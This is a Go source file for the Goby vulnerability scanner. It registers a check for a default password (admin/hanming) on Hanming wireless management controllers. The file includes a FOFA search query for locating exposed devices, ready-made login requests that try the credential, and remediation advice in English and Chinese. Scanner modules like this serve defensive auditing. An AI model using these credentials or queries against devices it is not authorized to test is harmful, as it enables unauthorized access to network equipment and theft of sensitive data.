package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "There is a default password on the Hamming Wireless Management Controller",
    "Description": "<p>Suzhou Hanming Technology Co., Ltd. is an independent research and development enterprise specializing in the development and promotion of wireless local area network (WLAN) communication software and hardware. The company's wireless Web management system has a default password.</p>",
    "Product": "Hamming-Wireless-CNTLR",
    "Homepage": "http://www.hanmingtech.com/",
    "DisclosureDate": "2022-04-28",
    "Author": "2935900435@qq.com",
    "FofaQuery": "server=\"INP httpd\"",
    "GobyQuery": "server=\"INP httpd\"",
    "Level": "1",
    "Impact": "<p>Attackers use this vulnerability to log in to the background of the system and obtain sensitive information.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/form/switchMlcVersion_login",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Ge  cko/20100101 Firefox/56.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Encoding": "gzip, deflate"
                },
                "data_type": "text",
                "data": "LoginAction=1&LoginLang=0&LoginUserName=admin&LoginPassword=hanming"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "main.asp",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/form/switchMlcVersion_login",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Ge  cko/20100101 Firefox/56.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Encoding": "gzip, deflate"
                },
                "data_type": "text",
                "data": "LoginAction=1&LoginLang=0&LoginUserName=admin&LoginPassword=hanming"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "main.asp",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|text|username:admin password:hanming"
            ]
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [
        "CNVD-2021-49089"
    ],
    "CVSSScore": "6",
    "Translation": {
        "CN": {
            "Name": "汉明无线管理控制器默认口令",
            "Product": "汉明科技-无线控制器",
            "Description": "<p>苏州汉明科技有限公司是一家专业致力于无线局域网（WLAN）通信软件和硬件开发与推广的自主研发型企业,该公司无线 Web 管理系统存在默认口令。<br></p><p>攻击者可利用默认口令&nbsp;admin/hanming 登录系统后台，获取敏感信息。<br></p>",
            "Recommendation": "<p><span style=\"color: var(--primaryFont-color);\">1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</span><br></p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>攻击者利用默认口令&nbsp;admin/hanming 登录系统后台，获取敏感信息。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "There is a default password on the Hamming Wireless Management Controller",
            "Product": "Hamming-Wireless-CNTLR",
            "Description": "<p>Suzhou Hanming Technology Co., Ltd. is an independent research and development enterprise specializing in the development and promotion of wireless local area network (WLAN) communication software and hardware. The company's wireless Web management system has a default password.<br></p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and&nbsp;<span style=\"color: var(--primaryFont-color);\">lowercase letters, numbers, and special characters, with more than 8 digits.</span></p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>Attackers use this vulnerability to log in to the background of the system and obtain sensitive information.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-07-28",
    "PocId": "10666"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}